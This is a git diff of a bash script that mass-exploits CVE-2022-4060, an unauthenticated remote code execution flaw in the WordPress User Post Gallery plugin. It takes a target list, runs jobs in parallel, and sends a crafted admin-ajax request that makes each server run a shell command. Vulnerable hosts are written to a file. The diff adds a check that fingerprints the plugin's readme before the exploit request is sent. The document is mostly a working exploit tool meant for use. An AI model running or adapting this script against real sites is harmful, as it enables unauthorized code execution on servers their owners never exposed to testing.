@@ -2,7 +2,7 @@
 # CVE-2022-4060 - User Post Gallery <= 2.19 - Unauthenticated RCE
 # Created By Im-Hanzou
 # Using GNU Parallel
-# Usage: bash upger.sh list.txt thread 
+# Usage: bash upger.sh list.txt thread
 
 yellow='\033[1;33m'
 classic='\033[0m'
@@ -34,13 +34,18 @@ if [[ ! $target =~ ^https?:// ]]; then
     target="https://$target"
 fi
 
-if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20Tout%20va%20bien:NULL:NULL") =~ 'Tout va bien' ]]; 
+if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-content/plugins/wp-upg/readme.txt") =~ 'Gallery - UPG' ]]; 
 then
-    printf "${green}[ Vuln ]${classic} => [$target]\n";
-    echo "$target" >> vuln.txt
+    if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20Tout%20va%20bien:NULL:NULL") =~ 'Tout va bien' ]];
+    then
+        printf "${green}[ Vuln ]${classic} => [$target]\n";
+        echo "$target" >> vuln.txt
+    else
+        printf "${red}[ Not Vuln ]${classic} => $target\n";
+        echo "$target" >> notvuln.txt
+    fi
 else
-    printf "${red}[ Not Vuln ]${classic} => $target\n";
-    echo "$target" >> notvuln.txt
+    printf "${red}[ Not UPG! ]${classic} => $target\n";
 fi
 }
 
